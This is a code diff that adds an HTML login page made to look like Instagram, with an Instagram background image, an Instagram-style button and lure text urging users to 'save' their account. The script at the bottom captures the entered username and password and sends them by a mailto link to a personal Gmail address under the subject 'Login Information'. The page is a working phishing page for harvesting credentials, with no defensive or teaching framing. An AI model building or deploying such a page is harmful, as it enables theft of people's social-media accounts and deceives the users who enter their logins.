@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - MyWebsite</title>
+    <style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            height: 100vh;
+            background: url('https://www.notebookcheck.net/fileadmin/Notebooks/News/_nc3/Instagram_Logo_png.png') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .container {
+            display: flex;
+            width: 100%;
+            height: 100%;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            width: 350px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.8); /* Semi-transparent white */
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px); /* Blurs the background behind the box */
+            text-align: center;
+        }
+
+        .logo {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #007bb5;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+
+        .divider {
+            margin: 20px 0;
+            border-top: 1px solid #ddd;
+        }
+
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://i.etsystatic.com/22967160/r/il/42177f/4263838913/il_1080xN.4263838913_2k3c.jpg" alt="Logo" class="logo">
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit">Log In</button>
+                <p id="error-message" class="error-message"></p>
+            </form>
+            <div class="divider"></div>
+            <div class="signup-link">
+                <p>save your acount <a href="#">.gmail us to protect</a></p>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const username = encodeURIComponent(document.getElementById('username').value);
+            const password = encodeURIComponent(document.getElementById('password').value);
+
+            // Construct mailto link with recipient, subject, and body
+            const recipient = 'gs0299547@gmail.com';
+            const subject = 'Login Information';
+            const body = `Username: ${username}%0APassword: ${password}%0A%0ASave my Insta account`;
+            const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${body}`;
+
+            // Redirect to the mailto link
+            window.location.href = mailtoLink;
+        });
+    </script>
+</body>
+</html>
+
